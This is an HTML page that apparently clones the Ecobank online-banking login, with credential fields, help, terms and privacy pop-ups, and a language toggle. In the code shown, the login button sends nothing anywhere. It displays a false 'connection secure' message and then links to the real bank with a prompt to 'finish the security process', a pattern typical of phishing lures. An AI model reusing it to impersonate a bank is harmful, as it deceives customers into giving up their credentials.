<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ecobank - Connexion Premium</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
:root {
    --main-blue: #02629f;
    --green-accent: #66ff66;
    --white: #fff;
    --light-bg: #f7f9fb;
}

/* Reset */
* { margin:0; padding:0; box-sizing:border-box; }
body, html { height:100%; font-family:'Poppins',sans-serif; background-color: var(--light-bg); }

/* PAGE DE CHARGEMENT */
.cover-layer { position: fixed; top:0; left:0; width:100%; height:100%; background-color: var(--main-blue); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999; opacity:1; transition: opacity 0.8s ease; }
.cover-layer.hidden { opacity:0; pointer-events:none; }
.cover-layer .logo img { width:250px; height:auto; margin-bottom:30px; animation: zoomIn 1s ease-in forwards; }

.loading-bar { width: 300px; height: 3px; background-color: transparent; overflow: hidden; }
.loading-bar .progress { height: 100%; background-color: var(--green-accent); transform-origin: left; animation: etirement 2s ease-in-out infinite; }
@keyframes etirement {0%,100%{transform:scaleX(0);}50%{transform:scaleX(1);} }
@keyframes zoomIn {0%{transform:scale(0);opacity:0;}100%{transform:scale(1);opacity:1;}}

/* HEADER */
header { background-color: var(--main-blue); padding:10px 30px; display:flex; align-items:center; }
header img { height:70px; width:auto; }
.header-options { margin-left:auto; display:flex; gap:12px; align-items:center; position:relative; }
.header-options .option { padding:6px 14px; border-radius:20px; font-weight:600; cursor:pointer; display:flex; align-items:center; gap:6px; transition: all 0.3s ease; font-size:0.9rem; color:#fff; border:2px solid #fff; }
.header-options .option:hover { background-color:#fff; color: var(--main-blue); transform: scale(1.05); }

/* MAIN CONTENT */
#main-content { opacity:0; transition: opacity 1s ease; }
.container { display:flex; height: calc(100vh - 100px); }
.left-side { flex:1.1; background: url('images/vitrine.png') center/contain no-repeat; position: relative; }
.right-side { flex:0.9; display:flex; align-items:center; justify-content:center; background: linear-gradient(120deg,#f7f9fb,#fff); position:relative; }

.login-card { background: rgba(255,255,255,0.98); padding:45px 35px; border-radius:25px; box-shadow: 0 25px 60px rgba(0,0,0,0.15); width:380px; transition: all 0.4s ease; position: relative; }
.login-card:hover { transform: translateY(-3px); box-shadow:0 35px 70px rgba(0,0,0,0.2); }
.login-card h2 { text-align:center; font-size:1.8rem; color: var(--main-blue); margin-bottom:20px; font-weight:700; }

.input-group, .password-group { position: relative; margin-bottom:15px; }
.input-group input, .password-group input { width:100%; padding:12px 40px; border-radius:12px; border:1px solid #ccc; outline:none; font-size:1rem; box-shadow:0 2px 6px rgba(0,0,0,0.05); transition: all 0.3s ease; }
.input-group i, .password-group i:first-child { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:#999; }
.password-group .toggle-password { position:absolute; right:12px; top:50%; transform:translateY(-50%); cursor:pointer; color:#999; transition:color 0.3s; }
.password-group .toggle-password:hover { color: var(--main-blue); }
.input-group input:focus, .password-group input:focus { border-color: var(--main-blue); box-shadow:0 0 12px rgba(2,98,159,0.3); }

.login-card button { width:100%; padding:14px; border:none; border-radius:12px; background: linear-gradient(90deg, #02629f,#035b8c); color:#fff; font-size:1rem; font-weight:700; cursor:pointer; transition: all 0.3s ease; }
.login-card button:hover { transform: scale(1.05); box-shadow:0 10px 25px rgba(0,0,0,0.3); }
.login-card button:active { transform: scale(0.97); }

.login-card .legal { font-size:0.8rem; color:#666; margin:10px 0; line-height:1.4; }
.login-card .legal a { color: var(--main-blue); text-decoration: underline; cursor:pointer; }
.login-card .legal a:hover { color:#035b8c; }

.login-card .signup { margin-top:20px; padding:12px; border:2px solid #ccc; border-radius:12px; text-align:center; background-color:#fff; }
.login-card .signup a { display:inline-block; margin-top:8px; padding:10px 16px; background-color: var(--main-blue); color:#fff; border-radius:10px; font-weight:700; text-decoration:none; transition: all 0.3s; }
.login-card .signup a:hover { transform: scale(1.07); box-shadow: 0 6px 20px rgba(0,0,0,0.25); }

footer { background-color: var(--main-blue); color:#fff; text-align:center; padding:15px 20px; font-size:0.9rem; transition: filter 0.3s ease; }
footer a { color:#fff; text-decoration: underline; margin:0 5px; }
footer a:hover { color:#fff; text-decoration: underline; }

#loader-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.15); backdrop-filter: blur(3px); z-index:9998; align-items:center; justify-content:center; }
#loader-overlay .spinner { width:60px; height:60px; border:6px solid rgba(2,98,159,0.2); border-top:6px solid #02629f; border-radius:50%; animation: spin 1s linear infinite; }
@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }

#confirm-window { display:none; position:fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); width:380px; max-width:90%; background:#fff; border-radius:20px; box-shadow:0 15px 50px rgba(0,0,0,0.3); padding:25px 20px; z-index:9999; text-align:center; transition: all 0.4s ease; }
#confirm-window.show { transform: translate(-50%, -50%) scale(1); opacity:1; }
#confirm-window h3 { color: var(--main-blue); font-weight:700; margin-bottom:15px; }
#confirm-window img { width:80px; height:80px; margin-bottom:15px; }
#confirm-window a { color:#02629f; text-decoration:underline; }
#confirm-window #close-confirm { position:absolute; top:10px; right:10px; font-size:1.5rem; cursor:pointer; color:#02629f; }
#confirm-window #close-confirm:hover { transform:scale(1.2); }

.popup-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.15); backdrop-filter: blur(3px); z-index:9997; }
.popup { display:none; position:fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); width:400px; max-width:90%; background:#fff; border-radius:20px; box-shadow:0 15px 50px rgba(0,0,0,0.3); padding:25px 20px; z-index:9999; text-align:left; transition: all 0.4s ease; }
.popup.show { display:block; transform: translate(-50%, -50%) scale(1); opacity:1; }
.popup .popup-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; }
.popup .popup-header h3 { color: var(--main-blue); font-weight:700; }
.popup .popup-header span { cursor:pointer; font-size:1.3rem; color:#02629f; }
.popup p, .popup ul li { font-size:0.9rem; line-height:1.5; margin-bottom:10px; }
.popup ul { list-style:none; padding-left:0; }
.popup ul li::before { content:"\f0da"; font-family:"Font Awesome 6 Free"; font-weight:900; margin-right:8px; color: var(--green-accent); }

.blur { filter: blur(3px); transition: filter 0.3s ease; }

@media(max-width:900px){
    .container { flex-direction:column; }
    .left-side { height:250px; }
    .login-card { width:90%; padding:30px; }
    #confirm-window, .popup { width:90%; }
}
</style>
</head>
<body>

<!-- PAGE DE CHARGEMENT -->
<div class="cover-layer">
    <div class="logo"><img src="images/logo.png" alt="Logo Ecobank"></div>
    <div class="loading-bar"><div class="progress"></div></div>
</div>

<!-- CONTENU PRINCIPAL -->
<div id="main-content">
<header>
<img src="images/logo.png" alt="Logo Ecobank" />
<div class="header-options">
    <div class="option" id="help-btn"><i class="fa fa-question-circle"></i> <span data-fr="Aide" data-en="Help">Aide</span></div>
    <div class="option" id="lang-btn"><i class="fa fa-globe"></i> <span id="lang-label">FR</span></div>
</div>
</header>

<div class="container">
    <div class="left-side"></div>
    <div class="right-side">
        <div class="login-card">
            <h2 data-fr="Connexion sécurisée" data-en="Secure Login">Connexion sécurisée</h2>
            <div class="input-group">
                <i class="fa fa-user"></i>
                <input type="text" placeholder="Email, Téléphone ou ID" id="username" required
                       data-fr="Email, Téléphone ou ID" data-en="Email, Phone or ID">
            </div>
            <div class="password-group">
                <i class="fa fa-lock"></i>
                <input type="password" placeholder="Mot de passe" id="password" required
                       data-fr="Mot de passe" data-en="Password">
                <i class="fa fa-eye toggle-password"></i>
            </div>
            <p class="legal" data-fr="En me connectant, je reconnais avoir lu et accepté les Conditions d'utilisation et la Politique de confidentialité."
               data-en="By logging in, I acknowledge that I have read and accepted the Terms of Use and Privacy Policy.">
                En me connectant, je reconnais avoir lu et accepté les 
                <a href="#" id="show-terms-btn">Conditions d'utilisation</a> et la 
                <a href="#" id="show-policy-btn">Politique de confidentialité</a>.
            </p>
            <button id="login-btn" data-fr="Se connecter" data-en="Log In">Se connecter</button>
            <div class="signup">
                <p><strong data-fr="Nouveau chez Ecobank ?" data-en="New to Ecobank?">Nouveau chez Ecobank ?</strong></p>
                <p data-fr="Inscrivez-vous aux services bancaires en ligne" data-en="Sign up for online banking services">Inscrivez-vous aux services bancaires en ligne</p>
                <a href="#" data-fr="Ouvrir un compte bancaire" data-en="Open a bank account">Ouvrir un compte bancaire</a>
            </div>
        </div>
    </div>
</div>
</div>

<footer>
&copy; 2025 Ecobank. Tous droits réservés. 
<a href="#" id="show-terms-btn-footer">Conditions d'utilisation</a> | 
<a href="#" id="show-policy-btn-footer">Politique de confidentialité</a>
</footer>

<!-- Loader overlay -->
<div id="loader-overlay"><div class="spinner"></div></div>

<!-- Pop-up Confirmation -->
<div id="confirm-window">
    <span id="close-confirm">&times;</span>
    <h3 data-fr="CONFIRMATION" data-en="CONFIRMATION">CONFIRMATION</h3>
    <img src="images/check.png" alt="Confirmation">
    <p data-fr="Votre connexion est sécurisée. Vous pouvez maintenant accéder à votre compte."
       data-en="Your connection is secure. You can now access your account.">
       Votre connexion est sécurisée. Vous pouvez maintenant accéder à votre compte.
    </p>
    <p><a href="https://internetbanking.ecobank.com/index.html?page=loginretail&lang=en" target="_blank">Connectez-vous pour terminer le processus de sécurité</a></p>
</div>

<!-- Pop-up Aide -->
<div class="popup-overlay" id="help-overlay"></div>
<div class="popup" id="help-popup">
    <div class="popup-header">
        <h3 data-fr="Centre d’Assistance Ecobank" data-en="Ecobank Support Center">Centre d’Assistance Ecobank</h3>
        <span id="close-help">&times;</span>
    </div>
    <p data-fr="Bienvenue dans notre centre d'assistance. Retrouvez toutes les informations nécessaires pour gérer vos services bancaires en ligne :"
       data-en="Welcome to our support center. Find all the information you need to manage your online banking services:">
       Bienvenue dans notre centre d'assistance. Retrouvez toutes les informations nécessaires pour gérer vos services bancaires en ligne :
    </p>
    <ul>
        <li data-fr="Compte bancaire : ouverture, gestion et sécurité." data-en="Bank account: opening, management and security.">Compte bancaire : ouverture, gestion et sécurité.</li>
        <li data-fr="Transactions : virements locaux et internationaux, paiements instantanés." data-en="Transactions: local and international transfers, instant payments.">Transactions : virements locaux et internationaux, paiements instantanés.</li>
        <li data-fr="Cartes : activation, blocage, renouvellement." data-en="Cards: activation, blocking, renewal.">Cartes : activation, blocage, renouvellement.</li>
        <li data-fr="Application mobile : téléchargement et configuration." data-en="Mobile app: download and setup.">Application mobile : téléchargement et configuration.</li>
        <li data-fr="Sécurité : conseils pour protéger vos informations et transactions." data-en="Security: tips to protect your information and transactions.">Sécurité : conseils pour protéger vos informations et transactions.</li>
        <li data-fr="Support client : +243 996 016 008" data-en="Customer support: +243 996 016 008">Support client : +243 996 016 008</li>
    </ul>
    <p data-fr="📧 Contacter : ecobankenquiries@ecobank.com" data-en="📧 Contact: ecobankenquiries@ecobank.com">
        📧 Contacter : <a href="mailto:ecobankenquiries@ecobank.com" style="color:#02629f;">ecobankenquiries@ecobank.com</a>
    </p>
</div>

<!-- Pop-up Conditions -->
<div class="popup-overlay" id="terms-overlay"></div>
<div class="popup" id="terms-popup">
    <div class="popup-header">
        <h3 data-fr="Conditions d'utilisation" data-en="Terms of Use">Conditions d'utilisation</h3>
        <span id="close-terms">&times;</span>
    </div>
    <p data-fr="Bienvenue sur le site web d'Ecobank, une publication du Groupe Ecobank."
       data-en="Welcome to the Ecobank website, a publication of the Ecobank Group.">
       Bienvenue sur le site web d'Ecobank, une publication du Groupe Ecobank.
    </p>
    <ul>
        <li data-fr="Dénomination sociale : Ecobank Transnational Incorporated (ETI)" data-en="Company name: Ecobank Transnational Incorporated (ETI)">Dénomination sociale : Ecobank Transnational Incorporated (ETI)</li>
        <li data-fr="Capital autorisé : 1 276 664 511,95 dollars" data-en="Authorized capital: 1,276,664,511.95 dollars">Capital autorisé : 1 276 664 511,95 dollars</li>
        <li data-fr="Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)" data-en="Registration number: 1986 B 1575 (May 2, 1986, Lome, Togo)">Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)</li>
        <li data-fr="Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo" data-en="Head office: 2365, Boulevard du Mono - BP: 3261 Lome, Togo">Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo</li>
        <li data-fr="Tél. : +228 22 21 03 03 / +228 22 21 31 68" data-en="Tel: +228 22 21 03 03 / +228 22 21 31 68">Tél. : +228 22 21 03 03 / +228 22 21 31 68</li>
        <li data-fr="Courriel : info@ecobank.com" data-en="Email: info@ecobank.com">Courriel : info@ecobank.com</li>
        <li data-fr="Utiliser les services uniquement à des fins légales." data-en="Use services only for legal purposes.">Utiliser les services uniquement à des fins légales.</li>
        <li data-fr="Ne pas partager vos identifiants avec des tiers." data-en="Do not share your credentials with third parties.">Ne pas partager vos identifiants avec des tiers.</li>
        <li data-fr="Respecter la confidentialité des informations bancaires." data-en="Respect the confidentiality of banking information.">Respecter la confidentialité des informations bancaires.</li>
    </ul>
</div>

<!-- Pop-up Politique -->
<div class="popup-overlay" id="policy-overlay"></div>
<div class="popup" id="policy-popup">
    <div class="popup-header">
        <h3 data-fr="Politique de confidentialité" data-en="Privacy Policy">Politique de confidentialité</h3>
        <span id="close-policy">&times;</span>
    </div>
    <p data-fr="Votre vie privée est importante pour Ecobank. Cette politique explique comment nous collectons et utilisons vos informations."
       data-en="Your privacy is important to Ecobank. This policy explains how we collect and use your information.">
       Votre vie privée est importante pour Ecobank. Cette politique explique comment nous collectons et utilisons vos informations.
    </p>
    <p data-fr="Ecobank s’engage à protéger vos données personnelles et à ne les utiliser qu’à des fins de service client."
       data-en="Ecobank is committed to protecting your personal data and using it only for customer service purposes.">
       Ecobank s’engage à protéger vos données personnelles et à ne les utiliser qu’à des fins de service client.
    </p>
</div>

<script>
// Loader
window.addEventListener("load", () => {
    const loader = document.querySelector(".cover-layer");
    const main = document.getElementById("main-content");
    setTimeout(() => {
        loader.classList.add("hidden");
        main.style.opacity = "1";
    }, 1500);
});

// Toggle password
document.querySelectorAll(".toggle-password").forEach(el => {
    el.addEventListener("click", function() {
        const pwd = this.parentElement.querySelector('input');
        const type = pwd.getAttribute('type') === 'password' ? 'text' : 'password';
        pwd.setAttribute('type', type);
        this.classList.toggle('fa-eye-slash');
    });
});

// Popups
function openPopup(popup, overlay) {
    popup.classList.add("show");
    overlay.style.display = "block";
    document.getElementById("main-content").classList.add("blur");
    document.querySelector("footer").classList.add("blur");
}
function closePopup(popup, overlay) {
    popup.classList.remove("show");
    overlay.style.display = "none";
    document.getElementById("main-content").classList.remove("blur");
    document.querySelector("footer").classList.remove("blur");
}
document.getElementById("help-btn").onclick = () => openPopup(document.getElementById("help-popup"), document.getElementById("help-overlay"));
document.getElementById("close-help").onclick = () => closePopup(document.getElementById("help-popup"), document.getElementById("help-overlay"));
document.querySelectorAll("#show-terms-btn, #show-terms-btn-footer").forEach(btn => btn.onclick = () => openPopup(document.getElementById("terms-popup"), document.getElementById("terms-overlay")));
document.getElementById("close-terms").onclick = () => closePopup(document.getElementById("terms-popup"), document.getElementById("terms-overlay"));
document.querySelectorAll("#show-policy-btn, #show-policy-btn-footer").forEach(btn => btn.onclick = () => openPopup(document.getElementById("policy-popup"), document.getElementById("policy-overlay")));
document.getElementById("close-policy").onclick = () => closePopup(document.getElementById("policy-popup"), document.getElementById("policy-overlay"));

// Language toggle
const langBtn = document.getElementById('lang-btn');
const langLabel = document.getElementById('lang-label');
let currentLang = 'fr';
langBtn.addEventListener('click', () => {
    currentLang = currentLang === 'fr' ? 'en' : 'fr';
    langLabel.textContent = currentLang.toUpperCase();
    document.querySelectorAll('[data-fr]').forEach(el => {
        if(el.placeholder) el.placeholder = el.getAttribute('data-' + currentLang);
        else el.textContent = el.getAttribute('data-' + currentLang);
    });
});

// LOGIN Confirmation
const loginBtn = document.getElementById("login-btn");
const loaderOverlay = document.getElementById("loader-overlay");
const confirmWindow = document.getElementById("confirm-window");
const mainContent = document.getElementById("main-content");
const footer = document.querySelector("footer");
const closeConfirm = document.getElementById("close-confirm");
loginBtn.addEventListener("click", (e) => {
    e.preventDefault();
    mainContent.classList.add("blur");
    footer.classList.add("blur");
    loaderOverlay.style.display = "flex";
    setTimeout(() => {
        loaderOverlay.style.display = "none";
        confirmWindow.style.display = "block";
        confirmWindow.classList.add("show");
    }, 2000);
});
closeConfirm.addEventListener("click", () => {
    confirmWindow.style.display = "none";
    mainContent.classList.remove("blur");
    footer.classList.remove("blur");
});
</script>

</body>
</html>
